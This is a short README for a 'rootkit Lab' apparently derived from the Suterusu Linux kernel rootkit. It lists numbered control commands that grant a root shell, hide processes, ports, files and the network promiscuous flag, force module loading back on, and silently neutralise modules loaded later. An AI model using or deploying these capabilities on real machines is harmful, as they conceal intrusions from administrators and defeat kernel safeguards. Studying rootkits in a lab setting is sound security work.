# rootkit Lab

> Modified from [Suterusu](https://github.com/mncoppola/suterusu)

### Command

Root shell

    $ ./control 0

Hide PID

    $ ./control 1 [pid]

Unhide PID

    $ ./control 2 [pid]

Hide TCPv4 port

    $ ./control 3 [port]

Unhide TCPv4 port

    $ ./control 4 [port]

Hide TCPv6 port

    $ ./control 5 [port]

Unhide TCPv6 port

    $ ./control 6 [port]

Hide UDPv4 port

    $ ./control 7 [port]

Unhide UDPv4 port

    $ ./control 8 [port]

Hide UDPv6 port

    $ ./control 9 [port]

Unhide UDPv6 port

    $ ./control 10 [port]

Hide file/directory

    $ ./control 11 [name]

Unhide file/directory

    $ ./control 12 [name]

Hide network PROMISC flag

    $ ./control 13

Unhide network PROMISC flag

    $ ./control 14

Enable module loading (force kernel.modules_disabled=0)

    $ ./control 15

Silently prohibit module loading (neutralize future loaded modules)

    $ ./control 16

Silently re-permit module loading (undo command 16)

    $ ./control 17